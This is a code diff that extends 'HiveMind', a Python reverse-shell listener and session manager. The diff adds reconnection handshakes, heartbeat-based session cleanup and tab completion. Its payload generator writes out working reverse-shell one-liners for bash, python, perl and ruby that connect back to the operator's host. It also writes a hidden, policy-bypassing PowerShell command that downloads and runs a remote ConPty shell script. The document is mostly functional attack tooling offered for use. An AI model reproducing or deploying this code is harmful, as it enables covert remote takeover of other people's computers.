@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 import socket
 import threading
 import os
@@ -6,87 +7,47 @@ import select
 import netifaces
 import subprocess
 import base64
-from termcolor import colored
 import time
 import readline  # For tab autocomplete and history
+from termcolor import colored
 
 # Global default port for all reverse shells
 DEFAULT_PORT = 4444
+# Global heartbeat timeout (in seconds) before considering a session dead.
+HEARTBEAT_TIMEOUT = 300  # 5 minutes
 
 # Global event that will be set when the listener thread has printed its startup message.
 listener_ready = threading.Event()
 
-# Define a list of payload types for auto-completion on "set payload" commands.
+# --- Enhanced Payload Types ---
 PAYLOAD_TYPES = [
     "windows/reverse_tcp/powershell",
     "windows/conpty",
     "linux/reverse_tcp/bash",
-    "linux/reverse_tcp/python"
+    "linux/reverse_tcp/python",
+    "linux/reverse_tcp/perl",
+    "linux/reverse_tcp/ruby"
 ]
 
+# Command list without the dashboard.
 COMMANDS = [
     'alias', 'cleanup', 'cmd', 'exit', 'help',
     'kill', 'session', 'sessions', 'set payload', 'show payloads', 'upgrade'
 ]
 
-def completer(text, state):
-    """
-    Custom completer function.
-    
-    - If the current command is "set payload", then:
-       * Token 2 (index 2) is for the payload type – complete using PAYLOAD_TYPES.
-       * Token 3 (index 3) is for the LHOST argument – complete using available interface names.
-       * Token 4 (index 4) is for the encoding option – complete using ["base64"].
-    - Otherwise, complete from the COMMANDS list.
-    """
-    buffer = readline.get_line_buffer()
-    tokens = buffer.split()
-    # Determine current token index
-    if buffer.endswith(" "):
-        current_token_index = len(tokens)
-    else:
-        current_token_index = len(tokens) - 1
+# --- Global Structures for Sessions ---
+class Session:
+    def __init__(self, session_id, conn, addr):
+        self.session_id = session_id
+        self.conn = conn
+        self.addr = addr
+        self.last_heartbeat = time.time()  # Timestamp of last activity
 
-    if tokens and tokens[0].lower() == "set" and len(tokens) >= 2 and tokens[1].lower() == "payload":
-        if current_token_index == 2:
-            # Completing payload type.
-            options = [p for p in PAYLOAD_TYPES if p.startswith(text)]
-            if state < len(options):
-                return options[state]
-            return None
-        elif current_token_index == 3:
-            # Completing LHOST argument using available interfaces.
-            interfaces = netifaces.interfaces()
-            options = [iface for iface in interfaces if iface.startswith(text)]
-            if state < len(options):
-                return options[state]
-            return None
-        elif current_token_index == 4:
-            # Completing encoding options.
-            ENCODING_OPTIONS = ["base64"]
-            options = [opt for opt in ENCODING_OPTIONS if opt.startswith(text)]
-            if state < len(options):
-                return options[state]
-            return None
-        else:
-            return None
-    else:
-        options = [cmd for cmd in COMMANDS if cmd.startswith(text)]
-        if state < len(options):
-            return options[state]
-        return None
-
-readline.set_completer(completer)
-readline.parse_and_bind("tab: complete")
-# Remove "/" from delimiters so that payload types (with slashes) are completed as a single word.
-readline.set_completer_delims(" \t\n")
-
-# Global dictionaries for sessions and aliases.
-# sessions: mapping session_id (int) -> connection
-# session_aliases: mapping alias (str) -> session_id (int)
+# sessions: mapping session_id (int) -> Session object
 sessions = {}
+# session_aliases: mapping alias (str) -> session_id (int)
 session_aliases = {}
-lock = threading.Lock()
+lock = threading.Lock()  # For synchronizing access to sessions and aliases
 
 # --- Helper for synchronized printing ---
 print_lock = threading.Lock()
@@ -95,12 +56,12 @@ def safe_print(*args, **kwargs):
         print(*args, **kwargs)
 
 # --- Utility Functions ---
-
 def color(text, color_code):
     """Wraps the given text with ANSI escape codes for the provided color code."""
     return f"\033[{color_code}m{text}\033[0m"
 
 def banner():
+    # Original banner as requested.
     banner_text = color(
         """
     ██╗  ██╗██╗██╗   ██╗███████╗███╗   ███╗██╗███╗   ██╗██████╗ 
@@ -118,24 +79,26 @@ def banner():
 def show_help():
     safe_print(colored("\n[ HiveMind Commands ]", "yellow"), flush=True)
     safe_print(colored("  alias <id|alias> <new_alias>         - Set an alias for a session", "green"), flush=True)
-    safe_print(colored("  cleanup                            - Clean up dead sessions", "green"), flush=True)
-    safe_print(colored("  cmd <command>                      - Execute a local shell command", "green"), flush=True)
-    safe_print(colored("  exit                               - Exit HiveMind", "green"), flush=True)
-    safe_print(colored("  help                               - Show this help menu", "green"), flush=True)
-    safe_print(colored("  kill <id|alias>                    - Kill a session", "green"), flush=True)
-    safe_print(colored("  session <id|alias>                 - Interact with a specific session (basic mode)", "green"), flush=True)
-    safe_print(colored("  sessions                           - Show all active sessions", "green"), flush=True)
+    safe_print(colored("  cleanup                              - Manually clean up dead sessions", "green"), flush=True)
+    safe_print(colored("  cmd <command>                        - Execute a local shell command", "green"), flush=True)
+    safe_print(colored("  exit                                 - Exit HiveMind", "green"), flush=True)
+    safe_print(colored("  help                                 - Show this help menu", "green"), flush=True)
+    safe_print(colored("  kill <id|alias>                      - Kill a session", "green"), flush=True)
+    safe_print(colored("  session <id|alias>                   - Interact with a specific session (basic mode)", "green"), flush=True)
+    safe_print(colored("  sessions                             - Show all active sessions", "green"), flush=True)
     safe_print(colored("  set payload <Type> <LHOST> [base64]  - Set payload (no port required)", "green"), flush=True)
-    safe_print(colored("  show payloads                      - List available payloads", "green"), flush=True)
-    safe_print(colored("  upgrade <id|alias>                 - Upgrade session to full TTY mode", "green"), flush=True)
+    safe_print(colored("  show payloads                        - List available payloads", "green"), flush=True)
+    safe_print(colored("  upgrade <id|alias>                   - Upgrade session to full TTY mode", "green"), flush=True)
     safe_print("", flush=True)
 
 def list_payloads():
     safe_print(colored("\n[ Available Payloads ]", "blue"), flush=True)
     safe_print(colored("  windows/reverse_tcp/powershell  - Standard PowerShell Reverse Shell", "green"), flush=True)
-    safe_print(colored("  windows/conpty                  - ConPty-based Reverse Shell (Use Upgrade <id>)", "green"), flush=True)
+    safe_print(colored("  windows/conpty                  - ConPty-based Reverse Shell (use upgrade)", "green"), flush=True)
     safe_print(colored("  linux/reverse_tcp/bash          - Bash Reverse Shell", "green"), flush=True)
-    safe_print(colored("  linux/reverse_tcp/python        - Python Reverse Shell\n", "green"), flush=True)
+    safe_print(colored("  linux/reverse_tcp/python        - Python Reverse Shell", "green"), flush=True)
+    safe_print(colored("  linux/reverse_tcp/perl          - Perl Reverse Shell", "green"), flush=True)
+    safe_print(colored("  linux/reverse_tcp/ruby          - Ruby Reverse Shell\n", "green"), flush=True)
 
 def resolve_ip(lhost):
     if lhost in netifaces.interfaces():
@@ -159,9 +122,16 @@ def generate_payload(payload_type, lhost, encode=False):
     resolved_host = resolve_ip(lhost)
     
     if payload_type == "windows/conpty":
+        # Run 'stty size' to obtain terminal rows and columns.
+        try:
+            size_output = subprocess.check_output(["stty", "size"], text=True).strip()
+            rows, cols = size_output.split()
+        except Exception as e:
+            safe_print(colored(f"[-] Failed to obtain terminal size: {e}. Using default values.", "red"), flush=True)
+            rows, cols = "24", "80"
         payload = (
             f"powershell -nop -W hidden -noni -ep bypass -c \"IEX((New-Object Net.WebClient).DownloadString('http://{resolved_host}/Invoke-ConPtyShell.ps1')); "
-            f"Invoke-ConPtyShell {resolved_host} {DEFAULT_PORT}\""
+            f"Invoke-ConPtyShell {resolved_host} {DEFAULT_PORT} -Rows {rows} -Cols {cols}\""
         )
     elif payload_type == "windows/reverse_tcp/powershell":
         script_body = (
@@ -194,13 +164,48 @@ def generate_payload(payload_type, lhost, encode=False):
             f"os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
             f"p=subprocess.call([\"/bin/sh\",\"-i\"])'"
         )
+    elif payload_type == "linux/reverse_tcp/perl":
+        payload = (
+            f"perl -e 'use Socket;$i=\"{resolved_host}\";$p={DEFAULT_PORT};"
+            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
+            f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{"
+            f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
+            f"exec(\"/bin/sh -i\");}};'"
+        )
+    elif payload_type == "linux/reverse_tcp/ruby":
+        payload = (
+            f"ruby -rsocket -e 'f=TCPSocket.new(\"{resolved_host}\",{DEFAULT_PORT});"
+            f"while(cmd=f.gets); IO.popen(cmd,\"r\"){{|io| f.print io.read}} end'"
+        )
     else:
         return "Invalid payload type."
     
     return payload
 
-# --- Networking Functions ---
+# --- Handshake & Reconnection Handling ---
+def perform_handshake(conn):
+    """
+    Simple handshake: the server sends a handshake prompt.
+    If the client replies with "session:<id>", we treat it as a reconnection.
+    Otherwise, or on timeout, it's a new session.
+    """
+    try:
+        conn.settimeout(5)
+        conn.send(b"HIVEMIND_HANDSHAKE\n")  # Prompt client to send handshake token
+        data = conn.recv(1024).strip()
+        conn.settimeout(None)
+        if data and data.lower().startswith(b"session:"):
+            return data.decode().strip()
+        else:
+            return "new"
+    except socket.timeout:
+        conn.settimeout(None)
+        return "new"
+    except Exception as e:
+        safe_print(colored(f"[-] Handshake error: {e}", "red"), flush=True)
+        return "new"
 
+# --- Networking Functions ---
 def start_listener(port):
     """
     Listens on the given port and spawns a new thread for each incoming connection.
@@ -214,12 +219,36 @@ def start_listener(port):
     except Exception as e:
         safe_print(colored(f"[-] Failed to start listener on port {port}: {e}", "red"), flush=True)
         sys.exit(1)
-    session_id = 1
+    
+    global_session_counter = 1
     while True:
         try:
             conn, addr = server.accept()
-            threading.Thread(target=handle_client, args=(conn, addr, session_id)).start()
-            session_id += 1
+            # Perform handshake to check for reconnection attempts
+            handshake_result = perform_handshake(conn)
+            if handshake_result != "new":
+                # Expecting format "session:<id>"
+                try:
+                    token = handshake_result.split(":", 1)[1]
+                    recon_sid = int(token)
+                    with lock:
+                        if recon_sid in sessions:
+                            sessions[recon_sid].conn.close()  # Close old connection
+                            sessions[recon_sid].conn = conn
+                            sessions[recon_sid].addr = addr
+                            sessions[recon_sid].last_heartbeat = time.time()
+                            safe_print(colored(f"[+] Session {recon_sid} reconnected from {addr}", "green"), flush=True)
+                            continue  # Do not create a new session
+                except Exception as e:
+                    safe_print(colored(f"[-] Invalid handshake token. Establishing as new session. ({e})", "red"), flush=True)
+            # Otherwise, establish a new session
+            with lock:
+                session_obj = Session(global_session_counter, conn, addr)
+                sessions[global_session_counter] = session_obj
+                safe_print(colored(f"[+] Session {global_session_counter} established from {addr}", "green"), flush=True)
+                global_session_counter += 1
+            # Launch a thread for potential background handling for this session.
+            threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
         except Exception as e:
             safe_print(colored(f"[-] Error accepting connection: {e}", "red"), flush=True)
 
@@ -228,7 +257,7 @@ def remove_session(session_id):
     with lock:
         if session_id in sessions:
             try:
-                sessions[session_id].close()
+                sessions[session_id].conn.close()
             except Exception:
                 pass
             del sessions[session_id]
@@ -241,16 +270,17 @@ def resolve_session_identifier(identifier):
     Resolves an identifier (numeric string or alias) to a session id.
     Returns an integer session id if found, otherwise None.
     """
-    if identifier.isdigit():
-        sid = int(identifier)
-        if sid in sessions:
-            return sid
-    elif identifier in session_aliases:
-        sid = session_aliases[identifier]
-        if sid in sessions:
-            return sid
-        else:
-            del session_aliases[identifier]
+    with lock:
+        if identifier.isdigit():
+            sid = int(identifier)
+            if sid in sessions:
+                return sid
+        elif identifier in session_aliases:
+            sid = session_aliases[identifier]
+            if sid in sessions:
+                return sid
+            else:
+                del session_aliases[identifier]
     return None
 
 def kill_session(identifier):
@@ -260,35 +290,43 @@ def kill_session(identifier):
         safe_print(colored(f"[-] No active session matching '{identifier}'.", "red"), flush=True)
     else:
         remove_session(sid)
-        safe_print(colored(f"[*] Session {sid} has been killed.", "yellow"), flush=True)
+        safe_print(colored(f"[*] Session {sid} has been terminated.", "yellow"), flush=True)
+
+# This function currently serves as a placeholder for any background handling.
+def handle_client(conn, addr):
+    pass
 
 # --- Session Handling Functions ---
-
-def handle_client(conn, addr, session_id):
-    safe_print(colored(f"[+] Session {session_id} established from {addr}", "green"), flush=True)
-    with lock:
-        sessions[session_id] = conn
-
 def interactive_shell(session_id):
-    if session_id not in sessions:
-        safe_print(colored(f"[-] No active session {session_id}", "red"), flush=True)
-        return
-    conn = sessions[session_id]
+    with lock:
+        if session_id not in sessions:
+            safe_print(colored(f"[-] No active session {session_id}", "red"), flush=True)
+            return
+        session = sessions[session_id]
     safe_print(colored(f"\n[*] Switched to session {session_id}. Press Ctrl+C to return to HiveMind menu.\n", "yellow"), flush=True)
     try:
         while True:
-            r, _, _ = select.select([conn, sys.stdin], [], [])
-            if conn in r:
-                data = conn.recv(4096)
+            r, _, _ = select.select([session.conn, sys.stdin], [], [])
+            if session.conn in r:
+                try:
+                    data = session.conn.recv(4096)
+                except Exception as e:
+                    safe_print(colored(f"[-] Error receiving data: {e}", "red"), flush=True)
+                    remove_session(session_id)
+                    break
                 if not data:
                     safe_print(colored("[-] Connection closed by remote host.", "red"), flush=True)
                     remove_session(session_id)
                     break
+                session.last_heartbeat = time.time()
                 safe_print(data.decode(errors="ignore"), end="", flush=True)
             if sys.stdin in r:
-                # Append a newline so the Windows payload doesn't trim the last character.
                 cmd = input(colored("", "cyan"))
-                conn.send((cmd+"\n").encode())
+                try:
+                    session.conn.send((cmd + "\n").encode())
+                except Exception as e:
+                    safe_print(colored(f"[-] Error sending data: {e}", "red"), flush=True)
+                    break
     except KeyboardInterrupt:
         safe_print(colored("\n[*] Returning to HiveMind menu...\n", "yellow"), flush=True)
     except Exception as e:
@@ -298,32 +336,31 @@ def interactive_shell(session_id):
 def upgrade_session(session_id):
     """
     Upgrades the selected session to a full interactive TTY mode.
-    Uses a short timeout with select to avoid freezing.
-    Note: Full TTY upgrade may not work properly with a Windows PowerShell reverse shell.
-    If you're using a PowerShell reverse shell, please use the basic interactive session (via the 'session' command) instead.
+    Note: Full TTY upgrade may not work properly with some reverse shells.
     """
-    if session_id not in sessions:
-        safe_print(colored(f"[-] No active session {session_id}", "red"), flush=True)
-        return
-    conn = sessions[session_id]
-    import tty, termios, sys, select
+    with lock:
+        if session_id not in sessions:
+            safe_print(colored(f"[-] No active session {session_id}", "red"), flush=True)
+            return
+        session = sessions[session_id]
+    import tty, termios
     old_tty = termios.tcgetattr(sys.stdin)
     safe_print(colored(f"\n[*] Upgrading session {session_id} to TTY mode. Press Ctrl+] to exit TTY mode.\n", "yellow"), flush=True)
-    safe_print(colored("[*] Note: Full TTY upgrade may not work properly with a Windows PowerShell reverse shell. "
-                         "If you're using a PowerShell reverse shell, please use the basic interactive session (via the 'session' command) instead.", "yellow"), flush=True)
+    safe_print(colored("[*] Note: Full TTY upgrade may not work with certain reverse shells.", "yellow"), flush=True)
     try:
         tty.setraw(sys.stdin.fileno())
         while True:
-            r, _, _ = select.select([conn, sys.stdin], [], [], 0.1)
-            if conn in r:
+            r, _, _ = select.select([session.conn, sys.stdin], [], [], 0.1)
+            if session.conn in r:
                 try:
-                    data = conn.recv(1024)
+                    data = session.conn.recv(1024)
                 except Exception as e:
                     safe_print(colored(f"[-] Error receiving data: {e}", "red"), flush=True)
                     break
                 if not data:
                     break
                 os.write(sys.stdout.fileno(), data)
+                session.last_heartbeat = time.time()
             if sys.stdin in r:
                 data = os.read(sys.stdin.fileno(), 1024)
                 if not data:
@@ -331,7 +368,7 @@ def upgrade_session(session_id):
                 if b'\x1d' in data:  # Ctrl+]
                     break
                 try:
-                    conn.send(data)
+                    session.conn.send(data)
                 except Exception as e:
                     safe_print(colored(f"[-] Error sending data: {e}", "red"), flush=True)
                     break
@@ -343,38 +380,106 @@ def upgrade_session(session_id):
 
 def list_sessions():
     safe_print(colored("\n[ Active Sessions ]", "blue"), flush=True)
-    if not sessions:
-        safe_print(colored("[-] No active sessions.", "red"), flush=True)
-    else:
-        for sid, conn in sessions.items():
-            try:
-                peer = conn.getpeername()
-                alias_str = ""
-                for alias, asid in session_aliases.items():
-                    if asid == sid:
-                        alias_str = f" (alias: {alias})"
-                        break
-                safe_print(colored(f"Session {sid}{alias_str}: {peer}", "green"), flush=True)
-            except Exception:
-                safe_print(colored(f"Session {sid}: [Disconnected]", "red"), flush=True)
+    with lock:
+        if not sessions:
+            safe_print(colored("[-] No active sessions.", "red"), flush=True)
+        else:
+            for sid, session in sessions.items():
+                try:
+                    peer = session.addr
+                    alias_str = ""
+                    for alias, asid in session_aliases.items():
+                        if asid == sid:
+                            alias_str = f" (alias: {alias})"
+                            break
+                    safe_print(colored(f"Session {sid}{alias_str}: {peer[0]}:{peer[1]}", "green"), flush=True)
+                except Exception:
+                    safe_print(colored(f"Session {sid}: [Disconnected]", "red"), flush=True)
     safe_print("", flush=True)
 
 def cleanup_sessions():
-    """Removes any sessions that are no longer active."""
+    """Automatically removes any sessions that are no longer active or have timed out."""
     removed = 0
-    for sid in list(sessions.keys()):
-        try:
-            sessions[sid].getpeername()
-        except Exception:
-            remove_session(sid)
-            removed += 1
-    safe_print(colored(f"[*] Cleanup complete. Removed {removed} dead session(s).", "yellow"), flush=True)
+    now = time.time()
+    with lock:
+        for sid, session in list(sessions.items()):
+            # If no activity for more than HEARTBEAT_TIMEOUT seconds, consider the session dead.
+            if now - session.last_heartbeat > HEARTBEAT_TIMEOUT:
+                try:
+                    session.conn.close()
+                except Exception:
+                    pass
+                del sessions[sid]
+                removed += 1
+    if removed:
+        safe_print(colored(f"[*] Auto-cleanup: Removed {removed} dead session(s).", "yellow"), flush=True)
+
+def auto_cleanup_thread():
+    while True:
+        time.sleep(30)
+        cleanup_sessions()
+
+# --- Enhanced Autocompletion ---
+def completer(text, state):
+    """
+    Custom completer function.
+    
+    For the "set payload" command, it offers specific completions.
+    For commands like "session", "kill", "upgrade", and "alias", it dynamically completes with active session IDs and aliases.
+    Otherwise, it completes from the COMMANDS list.
+    """
+    buffer = readline.get_line_buffer()
+    tokens = buffer.split()
+    if buffer.endswith(" "):
+        current_token_index = len(tokens)
+    else:
+        current_token_index = len(tokens) - 1
+
+    if tokens and tokens[0].lower() == "set" and len(tokens) >= 2 and tokens[1].lower() == "payload":
+        if current_token_index == 2:
+            options = [p for p in PAYLOAD_TYPES if p.startswith(text)]
+            if state < len(options):
+                return options[state]
+            return None
+        elif current_token_index == 3:
+            interfaces = netifaces.interfaces()
+            options = [iface for iface in interfaces if iface.startswith(text)]
+            if state < len(options):
+                return options[state]
+            return None
+        elif current_token_index == 4:
+            ENCODING_OPTIONS = ["base64"]
+            options = [opt for opt in ENCODING_OPTIONS if opt.startswith(text)]
+            if state < len(options):
+                return options[state]
+            return None
+        else:
+            return None
+    elif tokens and tokens[0].lower() in ["session", "kill", "upgrade", "alias"]:
+        if current_token_index == 1:
+            with lock:
+                dynamic_options = list(map(str, sessions.keys())) + list(session_aliases.keys())
+            options = [opt for opt in dynamic_options if opt.startswith(text)]
+            if state < len(options):
+                return options[state]
+            return None
+    else:
+        options = [cmd for cmd in COMMANDS if cmd.startswith(text)]
+        if state < len(options):
+            return options[state]
+        return None
+
+readline.set_completer(completer)
+readline.parse_and_bind("tab: complete")
+readline.set_completer_delims(" \t\n")
 
 # --- Command-Line Interface ---
-
 def command_line():
     while True:
-        cmd = input(colored("HiveMind > ", "cyan")).strip()
+        try:
+            cmd = input(colored("HiveMind > ", "cyan")).strip()
+        except EOFError:
+            break  # Exit on Ctrl+D
         lower_cmd = cmd.lower()
         parts = cmd.split()
 
@@ -413,11 +518,12 @@ def command_line():
             if sid is None:
                 safe_print(colored(f"[-] No active session matching '{identifier}'.", "red"), flush=True)
             else:
-                if new_alias in session_aliases:
-                    safe_print(colored(f"[-] Alias '{new_alias}' is already in use.", "red"), flush=True)
-                else:
-                    session_aliases[new_alias] = sid
-                    safe_print(colored(f"[*] Session {sid} now has alias '{new_alias}'.", "yellow"), flush=True)
+                with lock:
+                    if new_alias in session_aliases:
+                        safe_print(colored(f"[-] Alias '{new_alias}' is already in use.", "red"), flush=True)
+                    else:
+                        session_aliases[new_alias] = sid
+                        safe_print(colored(f"[*] Session {sid} now has alias '{new_alias}'.", "yellow"), flush=True)
 
         elif lower_cmd.startswith("kill "):
             if len(parts) != 2:
@@ -458,8 +564,9 @@ def command_line():
 
         elif lower_cmd == "exit":
             safe_print(colored("[*] Exiting HiveMind...", "yellow"), flush=True)
-            for sid in list(sessions.keys()):
-                remove_session(sid)
+            with lock:
+                for sid in list(sessions.keys()):
+                    remove_session(sid)
             break
 
         elif lower_cmd == "help":
@@ -473,4 +580,6 @@ if __name__ == "__main__":
     listener_thread = threading.Thread(target=lambda: start_listener(DEFAULT_PORT), daemon=True)
     listener_thread.start()
     listener_ready.wait()  # Wait until the listener has printed its startup message.
+    cleanup_thread = threading.Thread(target=auto_cleanup_thread, daemon=True)
+    cleanup_thread.start()
     command_line()
